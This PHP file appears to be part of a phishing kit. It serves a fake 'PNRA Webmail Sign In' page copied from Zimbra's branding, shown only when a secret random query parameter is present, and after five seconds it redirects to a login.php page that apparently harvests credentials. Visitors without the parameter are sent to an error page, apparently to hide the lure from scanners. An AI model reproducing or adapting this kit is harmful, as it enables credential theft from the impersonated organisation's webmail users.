<?php
$link = $_SERVER['REQUEST_URI'];
      
if($_GET['56gfbghjdtrteujhngh576598i7ujrthwr2446576ujghdgdfjertygdvsdfrgrgdet34543tregdf']){
    $urk='login.php?kyujtrgw436ytrhfvsd9856trdfhbgfhsf176hbfdbdfhfghdgsdfewtewr='.$_GET["56gfbghjdtrteujhngh576598i7ujrthwr2446576ujghdgdfjertygdvsdfrgrgdet34543tregdf"];
?>
<!DOCTYPE html>

<html lang="en">
<title>PNRA Webmail Sign In</title>
	<meta http-equiv="Refresh" content="5;url=<?=$urk?>"> 
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="files/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="files/favicon.ico">
	<head>
<body>
<
<div style="display:none;">
      <img src="files/LoginBanner.png" alt="">
      </div>
    
<div id="skin_container_splash_screen" class="SplashScreen">
	
	
	<div id="ZSplashPanel" class="center">
		<div class="contentBox">
			<h1><div id="ZLoginBannerImage" class="ImgLoginBanner" onclick="showCompanyUrl()"></div></h1>
			<div id="ZLoginAppName">
				Web Client
			</div>
			<div id="#ZSplashBodyContainer" class="content">
				<div class="message">
					Loading ...
				</div>
			</div>
		</div>
        <div class="decor1"></div>
	</div>
	<div class="Footer">
        <div class="copyright">
         Copyright © 2005-2022 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
        </div>
    </div>
	
	</body></html>
	<?php
    
}
else{
    header('location:error.php');
}

?>
